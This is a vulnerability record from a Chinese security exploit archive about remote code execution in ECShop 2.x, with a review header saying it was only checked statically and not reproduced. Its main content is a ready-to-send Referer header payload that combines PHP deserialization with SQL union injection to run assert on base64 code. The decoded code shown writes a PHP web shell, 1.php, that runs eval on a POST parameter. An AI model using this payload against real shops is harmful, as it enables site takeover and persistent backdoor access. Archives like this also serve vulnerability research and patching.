---
source: "白阁文库 BaizeSec/bylibrary"
product: "ECShop2.x"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ecshop2.x_命令执行"
prerequisites: "来源所述条件，未列明部分仍待核：Referer模板/SQL链及兼容assert字符串执行PHP；目录可写"
side_effects: "未执行；本文需注意的操作影响：解码片段有控制字符；写入依赖未列"
source_status: "unknown"
id: "vw-b0e44733f0f15f03469265c2"
entity_id: "ve-b0e44733f0f15f03469265c2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Referer模板/SQL链及兼容assert字符串执行PHP；目录可写

- **结论使用边界（1）**：只有Referer，无请求路径/方法及原理；2.x范围过宽。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：解码片段有控制字符；写入依赖未列。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：与Referer insert_ads链同漏洞族，并非独立OS命令注入。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ecshop2.x_命令执行

## Affected Version  

**ecshop2.x**

## POC 

**Referer处。**


### 代码执行

    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}

 在网站根目录下生成1.php的一句话。

    assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx
    file_put_contents('1.php','<?php eval($_POST[1337]); ?>')


---

> 来源：白阁文库 BaizeSec/bylibrary
